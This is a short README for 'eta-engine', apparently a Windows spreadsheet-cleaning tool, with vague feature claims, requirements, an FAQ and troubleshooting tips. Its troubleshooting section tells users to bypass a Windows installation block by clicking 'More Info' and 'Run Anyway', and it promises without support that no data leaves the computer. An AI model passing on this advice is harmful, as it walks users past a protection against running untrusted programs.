## 📖 About this application

The eta-engine application calculates complex data patterns to help you manage your tasks. It organizes large sets of information and produces clear reports. You do not need technical skills to use this tool. It runs on your local computer and keeps your information private.

The software automates repetitive data entry. It detects errors in your spreadsheets and fixes them. This saves time and prevents mistakes in your projects. 

## 🛠️ System requirements

Your computer needs specific parts to run eta-engine properly. Please check your system before you start.

- Operating System: Windows 10 or Windows 11.
- Memory: At least 4 gigabytes of RAM.
- Storage: 200 megabytes of free disk space.
- Processor: Any dual-core processor from the last five years.

These requirements ensure the software runs without delays. If your computer meets these standards, you will have a smooth experience.

## 🚀 Running the software

Once the installer finishes, you will see a shortcut on your desktop. Double-click this icon to open eta-engine. A main window will appear on your screen. This window contains all the buttons you need to load your data.

Click the Open button to select the file you want to process. The engine scans the file and highlights any issues. If the engine finds an error, it provides a simple fix button. Click this button to clean your data. After you finish your work, click the Save button to export your clean file.

Users often ask the following questions when they start with eta-engine.

Is my data safe?
Yes. Everything stays on your hard drive. No data travels to external servers.

What file types work with this tool?
The engine supports standard spreadsheet formats like CSV and Excel files.

Can I run multiple files?
You can load files one by one. The software processes each file before you move to the next.

What do I do if the program stops working?
Close the application and open it again. This usually fixes temporary glitches. If the issue remains, restart your computer.

## 💡 Troubleshooting tips

Sometimes you might face small issues during installation. Follow these steps to fix them.

If Windows blocks the installation, click the link that says More Info. Then click the Run Anyway button. This message appears because the file is new. 

If the application runs slowly, close other programs on your computer. This gives eta-engine more resources to perform its tasks. You can also move your file to the desktop before you load it, as this helps the software find the data faster.

Keep your Windows system updated to ensure you have the latest security features. This prevents conflicts between your operating system and the software.

## 📝 Performance settings

You can change settings to suit your needs. Click the Settings icon in the top right corner. You can change how the engine handles large files. 

If you work with very large lists, check the option that says Deep Scan. This makes the software take more time but checks for more hidden errors. For routine tasks, keep this unchecked to work at high speeds. 

The software remembers your preferences every time you open it. You do not need to change these settings again.
